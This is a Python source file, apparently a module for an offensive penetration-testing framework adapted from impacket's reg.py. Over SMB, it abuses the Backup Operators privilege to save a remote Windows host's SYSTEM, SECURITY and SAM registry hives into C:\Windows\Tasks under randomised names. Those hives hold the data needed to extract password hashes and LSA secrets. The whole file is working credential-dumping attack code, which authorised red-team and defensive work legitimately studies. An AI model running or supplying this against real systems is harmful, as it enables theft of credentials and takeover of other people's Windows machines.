# Credits: https://github.com/fortra/impacket/blob/7e25245e381a54045f5b039de9f7f9050f6c3c3c/examples/reg.py

from impacket.examples.secretsdump import RemoteOperations, rrp
from rich.console import Console
from random import choice

from handlers.smb_connection import SMBConnectionManager

console = Console()


class Backup:
    name = "backup"
    desc = "Abuse Backup Operator privilege to dump the SAM, SECURITY and SYSTEM files"
    module_protocol = ["smb"]
    opsec_safe = False
    multiple_hosts = False
    require_args = True
    min_args = 1

    def strip_root_key(self, dce, keyName):
        try:
            rootKey = keyName.split('\\')[0]
            subKey = '\\'.join(keyName.split('\\')[1:])
        except Exception:
            raise Exception('Error parsing keyName %s' % keyName)
        if rootKey.upper() == 'HKLM':
            ans = rrp.hOpenLocalMachine(dce)
        else:
            raise Exception('Invalid root key %s ' % rootKey)
        hRootKey = ans['phKey']
        return hRootKey, subKey
    
    def random_string(self) -> None:
        random_chars = ['a', 'b', 'c', 'd', 'e', 'f', '1', '2', '3', '4', '5']
        random_str = []

        for i in random_chars:
            char = choice(random_chars)
            random_str.append(char)

        return ''.join(random_str)
        
    def dump_hive(self, dce, key: str) -> None:
        hRootKey, subKey = self.strip_root_key(dce, key)
        ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
        outputFileName = "%s\%s.%s" % ("C:\\Windows\\Tasks", subKey, self.random_string())
        rrp.hBaseRegSaveKey(dce, ans2['phkResult'], outputFileName)
        console.print(f" [cyan]-[/] {key} saved in: {outputFileName}", highlight=False)

    def on_login(self, target) -> None:
        if not target or len(target.split()) < 1:
            console.print("[red]Usage:[/] backup <target>")
            return
        
        target_ip = target.split()[0]
        smb_manager = SMBConnectionManager()
        smb_connection = smb_manager.get_smb_connection(target_ip) 

        if smb_connection is None:
            console.print("[red][!][/] Unable to establish SMB connection.")
            return

        try:
            remoteOps = RemoteOperations(smb_connection, False)
            remoteOps.enableRegistry()

            console.print(f"[green][+][/] Connected to {target_ip} successfully", highlight=False)

            try:
                self.dump_hive(remoteOps.getRRP(), "HKLM\SYSTEM")
                self.dump_hive(remoteOps.getRRP(), "HKLM\SECURITY")
                self.dump_hive(remoteOps.getRRP(), "HKLM\SAM")

                console.print("")
            except Exception as error:
                console.print(f"[red][!][/] Error when dumping SAM, SECURITY or SYSTEM hives: {error}", highlight=False)
        except Exception as error:
            console.print(f"[red][!][/] Error: {error}", highlight=False)